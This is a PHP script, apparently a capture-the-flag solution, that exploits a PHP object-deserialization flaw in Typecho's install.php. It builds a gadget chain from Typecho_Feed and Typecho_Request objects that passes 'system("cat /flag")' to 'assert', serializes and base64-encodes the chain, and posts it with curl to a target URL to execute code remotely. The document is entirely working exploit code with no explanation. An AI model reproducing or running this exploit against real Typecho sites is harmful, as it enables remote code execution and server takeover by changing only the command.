<?php
const URL = "YOUR_URL_HERE";
class Typecho_Feed
{
    const RSS1 = 'RSS 1.0';
    const RSS2 = 'RSS 2.0';
    const ATOM1 = 'ATOM 1.0';
    private $_type;
    private $_items;

    public function __construct()
    {
        $this->_type = $this::RSS2;
        $this->_items[0] = array(
            'title' => '1',
            'link' => '1',
            'date' => 1604499627,
            'category' => array(new Typecho_Request()),
            'author' => new Typecho_Request(),
        );
    }
}

class Typecho_Request
{
    private $_params = array();
    private $_filter = array();

    public function __construct()
    {
        $this->_params['screenName'] = 'system("cat /flag")';
        $this->_filter[0] = 'assert';
    }
}

$exp = array(
    'adapter' => new Typecho_Feed(),
    'prefix' => 'typecho_'
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, URL . '/install.php?finish=1');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array("Referer:" . URL);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$postData = "__typecho_config=" . base64_encode(serialize($exp));
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$outcontent = curl_exec($ch);
echo $outcontent;
curl_close($ch);

